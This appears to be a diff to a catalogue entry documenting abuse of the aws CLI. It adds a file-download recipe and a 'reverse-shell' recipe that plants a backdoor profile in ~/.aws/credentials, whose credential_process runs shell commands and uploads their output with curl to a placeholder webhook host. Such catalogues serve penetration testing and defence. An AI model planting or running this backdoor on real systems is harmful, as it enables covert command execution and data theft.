@@ -8,6 +8,28 @@ functions:
       sudo:
       suid:
       unprivileged:
+  download:
+    - binary: true
+      code: |-
+        aws s3 cp s3://my-publicly-readable-bucket/file.txt /home/user/file.txt --no-sign
+      contexts:
+        sudo:
+        suid:
+        unprivileged:
+      sender: s3-storage
+  reverse-shell:
+  - code: |-
+      # Create the following ~/.aws/credentials file with any command in /bin/sh -c '' wrapper, for instance, sending the output of "id" to an HTTP server:
+      #
+      # [backdoor]
+      # credential_process = /bin/sh -c 'id > /tmp/id.txt; curl -T /tmp/id.txt https://<webhook>/upload/file.txt'
+
+      aws sts get-caller-identity --profile backdoor
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    listener: tcp-server
   inherit:
   - code: |-
       aws help
